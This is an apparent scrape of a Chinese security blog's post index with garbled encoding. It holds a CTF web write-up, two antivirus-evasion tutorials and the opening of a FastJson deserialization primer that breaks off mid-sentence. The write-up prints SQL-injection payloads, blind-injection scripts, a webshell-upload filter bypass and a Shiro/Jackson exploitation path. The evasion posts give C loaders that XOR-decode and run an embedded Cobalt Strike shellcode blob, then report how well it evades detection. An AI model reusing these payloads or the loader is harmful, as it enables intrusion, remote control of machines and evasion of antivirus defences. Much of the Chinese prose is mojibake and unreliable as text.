&quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); }}namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-&gt;img = new Memcache(); } }}namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-&gt;handle = new Model(); } }}namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-&gt;db = new Mysql(); $this-&gt;options['where'] = ''; $this-&gt;pk = 'id'; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32)),0)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); } }}namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));} åˆ©ç”¨åå¾—åˆ°å½“å‰æ•°æ®åº“ä¸ºmysqlï¼Œéœ€è¦æŸ¥è¯¢å…¶ä»–æ•°æ®åº“ å‘ç°testæ•°æ®åº“ æŸ¥è¯¢è¡¨åï¼Œå‘ç°flag 1updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='test'),1,32)),0)# æŸ¥è¯¢flagï¼Œç”±äºupdatexmlåªèƒ½è¯»å–32ä½ï¼Œéœ€è¦åˆ†ä¸¤æ¬¡è¯»å– 1updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),1,32)),0)# è¯»å–åé¢çš„flag 1updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),32,32)),0)# å¾—åˆ°flag 1flag{7c85503e-ea45-4bfe-ac62-3f2a27998348} javawebè®¿é—®/loginï¼Œå‘ç°Set-Cookieä¸­å­˜åœ¨remeberMeï¼Œåˆ¤æ–­æ˜¯shiroæ¡†æ¶ å­˜åœ¨/jsonï¼Œä½†æ˜¯éœ€è¦ç™»é™†æ‰èƒ½è®¿é—® åˆ©ç”¨Apache Shiro èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ CVE-2020-11989 https://www.cnblogs.com/backlion/p/14055275.html è¾“å…¥/;/jsonï¼ŒæˆåŠŸç™»é™†ï¼Œæç¤ºéœ€è¦jsonå­—ç¬¦ä¸² æµ‹è¯•å‘ç°å¯ä»¥ååºåˆ—åŒ– åœ¨vpsä¸­çœ‹åˆ°å›æ˜¾ jacksonååºåˆ—åŒ–ï¼Œåˆ©ç”¨å·¥å…· https://github.com/welk1n/JNDI-Injection-Exploit Springåˆ©ç”¨é“¾ï¼Œç›´æ¥åˆ©ç”¨å·¥å…·å³å¯ æˆåŠŸå¸¦å‡ºflag write_shell123456789101112131415161718192021222324252627282930313233343536 &lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input){ if(preg_match(&quot;/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i&quot;,$input)){ // if(preg_match(&quot;/'| |_|=|php/&quot;,$input)){ die('hacker!!!'); }else{ return $input; }}function waf($input){ if(is_array($input)){ foreach($input as $key=&gt;$output){ $input[$key] = waf($output); } }else{ $input = check($input); }}$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir)){ mkdir($dir);}switch($_GET[&quot;action&quot;] ?? &quot;&quot;) { case 'pwd': echo $dir; break; case 'upload': $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);}?&gt; åå¼•å·æ‰§è¡Œå‘½ä»¤ï¼Œç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½¿ç”¨$IFSç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨%09 1http://eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com/?action=upload&amp;data=&lt;?=`ls\\$IFS\\$9/`?&gt; è¯»å–flag 1http://eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com/?action=upload&amp;data=&lt;?=`cat\\$IFS\\$9\\`echo\\$IFS\\$9LyF3aGF0eW91d2FudGdnZ2dnZ2c0MDEucGhw|base64\\$IFS\\$9-d\\``?&gt; happsqlå¸ƒå°”ç›²æ³¨ã€‚å¯ä»¥ä½¿ç”¨regexpç›²æ³¨å’ŒexpæŠ¥é”™ç›²æ³¨ï¼Œåé¢è¿˜éœ€è¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥çš„çŸ¥è¯†ã€‚ regexpç›²æ³¨ï¼Œç”±äº^è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼Œé¢˜ç›®ä¸­è¿‡æ»¤äº†information_schemaï¼Œéœ€è¦å…ˆè¯»å–mysql.innodb_table_statsæ¥è·å¾—è¡¨åç„¶åå†è¿›è¡Œæ— åˆ—åæ³¨å…¥ã€‚ 1234567891011121314151617181920212223242526272829303132import binasciiimport stringimport requestsresult = ''for j in range(50): for i in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-,.&quot;: # for i in string.printable: url = &quot;http://eci-2ze6jljai3r428c1jf6q.cloudeci1.ichunqiu.com/login.php&quot; headers = { 'Content-Type': &quot;application/x-www-form-urlencoded&quot;, 'Referer': &quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com/index.php&quot;, 'Origin': &quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com&quot;, 'cache-control': &quot;no-cache&quot;, 'Postman-Token': &quot;21b59b79-a818-4fd1-a908-3112b45f9fc6&quot; } # 10. # response = requests.request(&quot;POST&quot;, url, data={ # 'username': 'admin&quot;||(select/**/version())/**/regexp/**/0x' + binascii.hexlify( # (&quot;^&quot; + result + i).encode()).decode() + '#', 'password': '123456'}, headers=headers) # ctf,f1ag, # response = requests.request(&quot;POST&quot;, url, data={ # 'username': 'admin&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x' + binascii.hexlify( # (&quot;^&quot; + result + i).encode()).decode() + '#', # 'password': '123456'}, headers=headers) response = requests.request(&quot;POST&quot;, url, data={'username': 'admin&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x' + binascii.hexlify((&quot;^&quot; + result + i).encode()).decode() + '#', 'password': '123456'}, headers=headers) print(response.text) if response.text.find(&quot;home&quot;) != -1: result += i print(result) breakprint(result) expæŠ¥é”™ç›²æ³¨è„šæœ¬ 123456789101112131415161718192021222324252627282930import osimport requestsimport stringurl = &quot;xxxxxxxx&quot;req = requests.session()string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']res = ''chars = string.printableresult = &quot;&quot;for i in range(1,45): for j in chars: data = { # a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))# #'username':'a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#'%(j,i,i), #æ•°æ®åº“ # 'username':'a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/regexp/**/&quot;ctf&quot;),%d)),%d),710,1))#'%(j,i,i),#è¡¨ 'username':'a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(x.2)/**/from/**/(select/**/2/**/union/**/select/**/*/**/from/**/f1ag)x),%d)),%d),710,1))#'%(j,i,i), 'password':'213' } rep = req.post(url,data) text = rep.text if 'home.php' in text: result += j print(result) break å‚è€ƒï¼š http://www.yang99.top/index.php/archives/48/ https://www.zhaoj.in/read-6859.html https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg","link":"/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"},{"title":"Cç¼–è¯‘xoråŠ å¯†shellcodeå…æ€","text":"ç”Ÿæˆshellcodecsç”Ÿæˆcæ ¼å¼shellcode ç”¨010editoråŠ å¯†shellcodeCtrl+Shift+Vå°†shellcodeå¤åˆ¶åˆ°010editorä¸­ï¼Œé€‰æ‹©Tools-&gt;Hex Operation-&gt;Binary Xorï¼Œè®¾ç½®è¿ç®—æ•°ä¸º0x97,å°†shellcodeä¸0x97å¼‚æˆ–åç”Ÿæˆæ–°çš„shellcode å°†shellcodeä¸0x97å¼‚æˆ–åç”Ÿæˆæ–°çš„shellcode Ctrl+Shift+cå¤åˆ¶shellcodeåˆ°Sublime textä¸­ï¼ŒCtrl+aé€‰ä¸­å…¨éƒ¨å°†shellcodeä¿®æ”¹æˆcè¯­è¨€ä¸­çš„åå…­è¿›åˆ¶æ ¼å¼ Visual Studioç¼–è¯‘ç”Ÿæˆexeæ–‡ä»¶å°†xoråŠ å¯†åçš„shellcodeä¸0x97å¼‚æˆ–è¿˜åŸåæ‰§è¡Œ ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void(_stdcall *CODE)();#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)unsigned char shellcode[] =&quot;\\x6B\\xDF\\x14\\x73\\x67\\x7F\\x5F\\x97\\x97\\x97\\xD6\\xC6\\xD6\\xC7\\xC5\\xC6&quot;&quot;\\xC1\\xDF\\xA6\\x45\\xF2\\xDF\\x1C\\xC5\\xF7\\xDF\\x1C\\xC5\\x8F\\xDF\\x1C\\xC5&quot;&quot;\\xB7\\xDF\\x1C\\xE5\\xC7\\xDF\\x98\\x20\\xDD\\xDD\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xAB\\xF6\\xEB\\x95\\xBB\\xB7\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\x75\\x7A&quot;&quot;\\xC5\\xD6\\xC6\\xDF\\x1C\\xC5\\xB7\\x1C\\xD5\\xAB\\xDF\\x96\\x47\\xF1\\x16\\xEF&quot;&quot;\\x8F\\x9C\\x95\\xE2\\xE5\\x1C\\x17\\x1F\\x97\\x97\\x97\\xDF\\x12\\x57\\xE3\\xF0&quot;&quot;\\xDF\\x96\\x47\\xC7\\x1C\\xDF\\x8F\\xD3\\x1C\\xD7\\xB7\\xDE\\x96\\x47\\x74\\xC1&quot;&quot;\\xDF\\x68\\x5E\\xD6\\x1C\\xA3\\x1F\\xDF\\x96\\x41\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\xAF\\x77\\xE2\\x66\\xDB\\x94\\xDB\\xB3&quot;&quot;\\x9F\\xD2\\xAE\\x46\\xE2\\x4F\\xCF\\xD3\\x1C\\xD7\\xB3\\xDE\\x96\\x47\\xF1\\xD6&quot;&quot;\\x1C\\x9B\\xDF\\xD3\\x1C\\xD7\\x8B\\xDE\\x96\\x47\\xD6\\x1C\\x93\\x1F\\xDF\\x96&quot;&quot;\\x47\\xD6\\xCF\\xD6\\xCF\\xC9\\xCE\\xCD\\xD6\\xCF\\xD6\\xCE\\xD6\\xCD\\xDF\\x14&quot;&quot;\\x7B\\xB7\\xD6\\xC5\\x68\\x77\\xCF\\xD6\\xCE\\xCD\\xDF\\x1C\\x85\\x7E\\xD8\\x68&quot;&quot;\\x68\\x68\\xCA\\xFD\\x97\\xDE\\x29\\xE0\\xFE\\xF9\\xFE\\xF9\\xF2\\xE3\\x97\\xD6&quot;&quot;\\xC1\\xDE\\x1E\\x71\\xDB\\x1E\\x66\\xD6\\x2D\\xDB\\xE0\\xB1\\x90\\x68\\x42\\xDF&quot;&quot;\\xA6\\x5E\\xDF\\xA6\\x45\\xDA\\xA6\\x57\\xDA\\xA6\\x5E\\xD6\\xC7\\xD6\\xC7\\xD6&quot;&quot;\\x2D\\xAD\\xC1\\xEE\\x30\\x68\\x42\\x7C\\xE4\\xCD\\xDF\\x1E\\x56\\xD6\\x2F\\xC7&quot;&quot;\\x97\\x97\\x97\\xDA\\xA6\\x5E\\xD6\\xC6\\xD6\\xC6\\xFD\\x94\\xD6\\xC6\\xD6\\x2D&quot;&quot;\\xC0\\x1E\\x08\\x51\\x68\\x42\\x7C\\xCE\\xCC\\xDF\\x1E\\x56\\xDF\\xA6\\x45\\xDE&quot;&quot;\\x1E\\x4F\\xDA\\xA6\\x5E\\xC5\\xFF\\x97\\x95\\xD7\\x13\\xC5\\xC5\\xD6\\x2D\\x7C&quot;&quot;\\xC2\\xB9\\xAC\\x68\\x42\\xDF\\x1E\\x51\\xDF\\x14\\x54\\xC7\\xFD\\x9D\\xC8\\xDF&quot;&quot;\\x1E\\x66\\xDF\\x1E\\x4D\\xDE\\x50\\x57\\x68\\x68\\x68\\x68\\xDA\\xA6\\x5E\\xC5&quot;&quot;\\xC5\\xD6\\x2D\\xBA\\x91\\x8F\\xEC\\x68\\x42\\x12\\x57\\x98\\x12\\x0A\\x96\\x97&quot;&quot;\\x97\\xDF\\x68\\x58\\x98\\x13\\x1B\\x96\\x97\\x97\\x7C\\x44\\x7E\\x73\\x96\\x97&quot;&quot;\\x97\\x7F\\x35\\x68\\x68\\x68\\xB8\\xED\\xDE\\xD1\\xC3\\x97\\x78\\x6F\\xCF\\x9C&quot;&quot;\\xEF\\x6F\\x7B\\x00\\x38\\x66\\xFD\\xA8\\xFF\\x7B\\xCF\\xF8\\x9A\\x4B\\xA7\\x08&quot;&quot;\\x95\\x69\\x8B\\x57\\xDF\\x10\\xFE\\x9E\\xB6\\x17\\x81\\xB4\\xC6\\x50\\x5A\\xE7&quot;&quot;\\xFD\\x31\\x7C\\xF6\\x3A\\xD4\\xCA\\x4D\\xA2\\x00\\x6B\\xBF\\x1D\\xB4\\x62\\x1B&quot;&quot;\\xC6\\xA3\\x87\\x19\\xEE\\x2E\\xBA\\x2A\\x4B\\xD8\\x89\\x65\\xB2\\xF3\\xB0\\xC8&quot;&quot;\\xF3\\x1B\\x92\\x1A\\xFF\\x97\\xC2\\xE4\\xF2\\xE5\\xBA\\xD6\\xF0\\xF2\\xF9\\xE3&quot;&quot;\\xAD\\xB7\\xDA\\xF8\\xED\\xFE\\xFB\\xFB\\xF6\\xB8\\xA2\\xB9\\xA7\\xB7\\xBF\\xF4&quot;&quot;\\xF8\\xFA\\xE7\\xF6\\xE3\\xFE\\xF5\\xFB\\xF2\\xAC\\xB7\\xDA\\xC4\\xDE\\xD2\\xB7&quot;&quot;\\xA6\\xA7\\xB9\\xA7\\xAC\\xB7\\xC0\\xFE\\xF9\\xF3\\xF8\\xE0\\xE4\\xB7\\xD9\\xC3&quot;&quot;\\xB7\\xA1\\xB9\\xA5\\xAC\\xB7\\xC0\\xFE\\xF9\\xA1\\xA3\\xAC\\xB7\\xEF\\xA1\\xA3&quot;&quot;\\xAC\\xB7\\xC3\\xE5\\xFE\\xF3\\xF2\\xF9\\xE3\\xB8\\xA1\\xB9\\xA7\\xBE\\x9A\\x9D&quot;&quot;\\x97\\x64\\xF1\\xB2\\xFD\\x10\\x92\\x3B\\x83\\x57\\x64\\x8C\\xAA\\x47\\xD8\\x6B&quot;&quot;\\xB3\\xE3\\xBE\\xF9\\x75\\x1C\\xA5\\xD6\\x70\\x91\\xE2\\xF2\\x6A\\xA1\\xB6\\xF0&quot;&quot;\\x32\\x70\\x6D\\x9F\\xE9\\xD6\\x2F\\xA9\\x34\\x2F\\x15\\x73\\xD8\\x66\\x8F\\x20&quot;&quot;\\x1D\\x9A\\xCA\\xBF\\x50\\x3C\\x69\\x66\\xA7\\x99\\xB9\\x80\\xF3\\xEF\\x82\\x8E&quot;&quot;\\xC2\\xC5\\x9A\\x01\\xD2\\xDC\\x79\\x99\\xEE\\x32\\x4C\\x6C\\xB0\\x2E\\x1E\\xF0&quot;&quot;\\xCD\\x26\\x7C\\xE3\\x1D\\x78\\x82\\xF1\\xFD\\x88\\xB7\\x23\\x9D\\xCC\\x7A\\x5A&quot;&quot;\\xE5\\x46\\xF0\\xD7\\xCA\\xCC\\x3E\\xAB\\xF5\\x09\\xBB\\x3C\\x52\\x1E\\xAB\\x1A&quot;&quot;\\x3A\\x2F\\xF7\\x1E\\xF7\\xCF\\xA6\\x2B\\x93\\xBF\\xAB\\xFB\\xF7\\x44\\x2E\\xD8&quot;&quot;\\x69\\x64\\x26\\xD9\\xB6\\xB2\\xB9\\xDF\\xF6\\x27\\x52\\x8A\\x1A\\x26\\x81\\x14&quot;&quot;\\xFD\\xD6\\x88\\xD6\\x23\\x1F\\x6E\\xFC\\x09\\x30\\x57\\xEC\\x80\\xE1\\x14\\xF9&quot;&quot;\\x62\\x5A\\x84\\xA4\\x85\\xA1\\xC8\\xE2\\x43\\xFC\\x6E\\x18\\x95\\x90\\x7E\\x31&quot;&quot;\\x03\\x78\\x32\\x18\\x9A\\x89\\xDA\\xAF\\x84\\x5B\\x95\\x21\\x78\\xF4\\xA3\\x7F&quot;&quot;\\x82\\x36\\x32\\xE0\\x44\\x13\\x1A\\x39\\xE2\\x47\\xE7\\xED\\xA3\\x93\\x80\\x53&quot;&quot;\\x05\\xCC\\x5A\\xBD\\x3E\\x97\\xD6\\x29\\x67\\x22\\x35\\xC1\\x68\\x42\\xDF\\xA6&quot;&quot;\\x5E\\x2D\\x97\\x97\\xD7\\x97\\xD6\\x2F\\x97\\x87\\x97\\x97\\xD6\\x2E\\xD7\\x97&quot;&quot;\\x97\\x97\\xD6\\x2D\\xCF\\x33\\xC4\\x72\\x68\\x42\\xDF\\x04\\xC4\\xC4\\xDF\\x1E&quot;&quot;\\x70\\xDF\\x1E\\x66\\xDF\\x1E\\x4D\\xD6\\x2F\\x97\\xB7\\x97\\x97\\xDE\\x1E\\x6E&quot;&quot;\\xD6\\x2D\\x85\\x01\\x1E\\x75\\x68\\x42\\xDF\\x14\\x53\\xB7\\x12\\x57\\xE3\\x21&quot;&quot;\\xF1\\x1C\\x90\\xDF\\x96\\x54\\x12\\x57\\xE2\\x40\\xCF\\xCF\\xCF\\xDF\\x92\\x97&quot;&quot;\\x97\\x97\\x97\\xC7\\x54\\x7F\\x08\\x6A\\x68\\x68\\xA6\\xAE\\xA5\\xB9\\xA6\\xA1&quot;&quot;\\xAF\\xB9\\xA5\\xA7\\xA3\\xB9\\xA6\\xA3\\xA4\\x97\\x85\\xA3\\xC1\\xEF&quot;;unsigned char xorshellcode[sizeof(shellcode)];void main(){ for (int i = 0; i &lt; sizeof(shellcode) - 1; i++) { xorshellcode[i] = shellcode[i]^0x97; } PVOID p = NULL; p = VirtualAlloc(NULL, sizeof(xorshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (p == NULL) { return; } memcpy(p, xorshellcode, sizeof(xorshellcode)); CODE code = (CODE)p; code();} å…æ€æ•ˆæœæµ‹è¯•VirusTotalæŸ¥æ€ç‡15/69 ç«ç»’ä¸æ€ï¼Œå¡å·´æ–¯åŸºæ‹¦æˆª csä¸Šçº¿ å‚è€ƒ:https://www.freebuf.com/articles/system/228233.html https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html","link":"/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/"},{"title":"Cç¼–è¯‘shellcode+shieldenåŠ å£³å…æ€ç«ç»’ã€å¡å·´æ–¯åŸº","text":"CS ç”Ÿæˆ shellcodeåœ¨Payload Generatorå¤„é€‰æ‹©veilï¼Œç”Ÿæˆshellcode ç”Ÿæˆshellcode ä½¿ç”¨Visual Studio 2017ç¼–è¯‘shellcodeå¤åˆ¶shellcodeåˆ°ä»¥ä¸‹ä»£ç ä¸­ 123456789101112131415// MSF.cpp : æ­¤æ–‡ä»¶åŒ…å« &quot;main&quot; å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚#include &lt;iostream&gt;#include &quot;stdio.h&quot;#include &quot;Windows.h&quot;#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;) //å»é™¤çª—å£//æ­¥éª¤bæ‰€åœ¨æ¡Œé¢äº§ç”Ÿçš„ shellcode.cçš„å†…å®¹;unsigned char shellcode[] = &quot;&quot;;void main(){ //ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW); LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(Memory, shellcode, sizeof(shellcode)); ((void(*)())Memory)();} åœ¨Visual Studioä¸­æ–°å»ºæ§åˆ¶å°åº”ç”¨ç¨‹åºå¹¶å¤åˆ¶ä»£ç  æŒ‰å¦‚å›¾è®¾ç½®ç¼–è¯‘é€‰é¡¹ é€‰æ‹©é‡æ–°ç”Ÿæˆè§£å†³æ–¹æ¡ˆï¼Œç”ŸæˆConsoleApplication4.exe ä½¿ç”¨ç”¨Restorator 2018ä¸ºç”Ÿæˆçš„exeæ–‡ä»¶æ·»åŠ å›¾æ ‡å°†ConsoleApplication4.exeæ‹–å…¥Restorator 2018ï¼Œå³é”®é€‰æ‹©æ·»åŠ èµ„æºï¼Œåç§°å¯éšæ„å¡«å†™ å°†icoæ–‡ä»¶æ‹–å…¥Restorator 2018å¹¶ä¿å­˜ è¿ç”¨shieldenä¸ºexeæ–‡ä»¶åŠ å£³è®¾ç½®å¦‚ä¸‹ å…æ€æ•ˆæœvirustotal.comä¸Š shellcode_launcher.exe æŸ¥æ€ç‡ä¸º17/71 æœ¬åœ°æµ‹è¯•ï¼Œé™æ€æ‰«æç«ç»’ä¸å¡å·´æ–¯åŸºå‡ä¸æŸ¥æ€ csä¸Šçº¿ å‚è€ƒé“¾æ¥ä½¿ç”¨ C ç¼–è¯‘ shellcode å…æ€ä¸Šçº¿","link":"/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/"},{"title":"FastJsonååºåˆ—åŒ–","text":"Fastjsonä½¿ç”¨astjsonæ˜¯Alibabaå¼€å‘çš„Javaè¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½JSONåº“ï¼Œç”¨äºå°†æ•°æ®åœ¨JSONå’ŒJava Objectä¹‹é—´äº’ç›¸è½¬æ¢ï¼Œæä¾›ä¸¤ä¸ªä¸»è¦æ¥å£JSON.toJSONStringå’ŒJSON.parseObject/JSON.parseæ¥åˆ†åˆ«å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚ pom.xmlè®¾ç½® 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; å…ˆå®šä¹‰ä¸€ä¸ªUserç±» 1234567891011121314151617181920public class User { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} FastJsonååºåˆ—åŒ–æœ‰ä¸‰ç§æ–¹æ³• 12345678910111213141516171819202122232425262728293031import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class Test { public static void main(String[] args) { User user=new User(); user.setName(&quot;admin&quot;); user.setAge(14); //åºåˆ—åŒ– String serializedStr=JSON.toJSONString(user); System.out.println(serializedStr); //ååºåˆ—åŒ– Object obj1=JSON.parse(serializedStr); System.out.println(&quot;é€šè¿‡parseæ–¹æ³•ååºåˆ—åŒ–&quot;); System.out.println(obj1.getClass().getName()); System.out.println(obj1); Object obj2=JSON.parseObject(serializedStr); System.out.println(&quot;é€šè¿‡parseObjectæ–¹æ³•ï¼Œä¸æŒ‡å®šç±»è¿›è¡Œååºåˆ—åŒ–&quot;); System.out.println(obj2.getClass().getName()); System.out.println(obj2); Object obj3=JSON.parseObject(serializedStr,User.class); System.out.println(&quot;é€šè¿‡parseObjectæ–¹æ³•ï¼ŒæŒ‡å®šUserç±»è¿›è¡Œååºåˆ—åŒ–&quot;); System.out.println(obj3.getClass().getName()); System.out.println(obj3); }} æ‰§è¡Œç»“æœå¦‚ä¸‹ å¯ä»¥çœ‹åˆ°JSON.parseå’ŒæœªæŒ‡å®šå¯¹è±¡çš„JSON.parseObjectéƒ½ä¼šè¿”å›JSONObjectï¼Œè€ŒJSON.parseObjectæŒ‡å®šç±»åä¼šè¿”å›ç›¸åº”çš„ç±»å¯¹è±¡ã€‚å®ƒä»¬ä¸ä»…è¿”å›ç»“æœä¸åŒï¼Œæ‰§è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨çš„æ–¹æ³•ä¹Ÿä¸åŒã€‚ typeå­—æ®µä¿®æ”¹Userç±» 12345678910111213141516171819202122232425public class User { private String name; private int age; public String getName() { System.out.println(&quot;getName&quot;); return name; } public void setName(String name) { System.out.println(&quot;setName&quot;); this.name = name; } public int getAge() { System.out.println(&quot;getAge&quot;); return age; } public void setAge(int age) { System.out.println(&quot;setAge&quot;); this.age = age; }} FastJsonä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šå­—æ®µtypeï¼Œè¿™ä¸ªå­—æ®µå¯ä»¥æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨è°ƒç”¨ç±»ä¸­ç¬¦åˆè§„åˆ™çš„ç‰¹å®šçš„setterå’Œgetteræ–¹æ³•ã€‚ 12345parse(&quot;&quot;) ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ç‰¹å®š setter æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³•parseObject(&quot;&quot;) ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„ç‰¹å®š setter å’Œ getter æ–¹æ³•parseObject(&quot;&quot;,class) ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ç‰¹å®š setter æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³• è§„åˆ™ 1234567891011setå¼€å¤´çš„æ–¹æ³•è¦æ±‚å¦‚ä¸‹ï¼š- æ–¹æ³•åé•¿åº¦å¤§äº4ä¸”ä»¥setå¼€å¤´ï¼Œä¸”ç¬¬å››ä¸ªå­—æ¯è¦æ˜¯å¤§å†™- éé™æ€æ–¹æ³•- è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»- å‚æ•°ä¸ªæ•°ä¸º1ä¸ªgetå¼€å¤´çš„æ–¹æ³•è¦æ±‚å¦‚ä¸‹ï¼š- æ–¹æ³•åé•¿åº¦å¤§äºç­‰äº4 - éé™æ€æ–¹æ³•- ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™- æ— ä¼ å…¥å‚æ•°- è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollection Map AtomicBoolean AtomicInteger AtomicLong Demo 123456789101112131415161718192021222324252627import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class Test { public static void main(String[] args) { String jsonstring=&quot;{\\&quot;@type\\&quot;:\\&quot;User\\&quot;,\\&quot;age\\&quot;:80,\\&quot;name\\&quot;:\\&quot;admin\\&quot;}&quot;; System.out.println(&quot;parse:&quot;); Object obj1=JSON.parse(jsonstring); System.out.println(obj1.getClass().getName()); System.out.println(obj1); System.out.println(&quot;parseObject:&quot;); Object obj2=JSON.parseObject(jsonstring); System.out.println(obj2.getClass().getName()); System.out.println(obj2); System.out.println(&quot;parseObject with class:&quot;); Object obj3=JSON.parseObject(jsonstring,User.class); System.out.println(obj3.getClass().getName()); System.out.println(obj3); }} è¿è¡Œç»“æœ 12345typeå¯ä»¥æŒ‡å®šååºåˆ—åŒ–æˆæœåŠ¡å™¨ä¸Šçš„ä»»æ„ç±»ç„¶åæœåŠ¡ç«¯ä¼šè§£æè¿™ä¸ªç±»ï¼Œæå–å‡ºè¿™ä¸ªç±»ä¸­ç¬¦åˆè¦æ±‚çš„setteræ–¹æ³•ä¸getteræ–¹æ³•ï¼ˆå¦‚setxxxï¼‰å¦‚æœä¼ å…¥jsonå­—ç¬¦ä¸²çš„é”®å€¼ä¸­å­˜åœ¨è¿™ä¸ªå€¼ï¼ˆå¦‚xxx)ï¼Œå°±ä¼šå»è°ƒç”¨æ‰§è¡Œå¯¹åº”çš„setterã€getteræ–¹æ³•ï¼ˆå³setxxxæ–¹æ³•ã€getxxxæ–¹æ³•ï¼‰ åˆ©ç”¨é“¾TemplatesImplåŸºäºJDK 7u21 Gadgetsï¼Œ1.7ç‰ˆæœ¬é€šç”¨ï¼Œåˆ©ç”¨æ¡ä»¶è‹›åˆ» åˆ©ç”¨æ¡ä»¶ 1231. æœåŠ¡ç«¯ä½¿ç”¨parseObject()æ—¶ï¼Œå¿…é¡»ä½¿ç”¨å¦‚ä¸‹æ 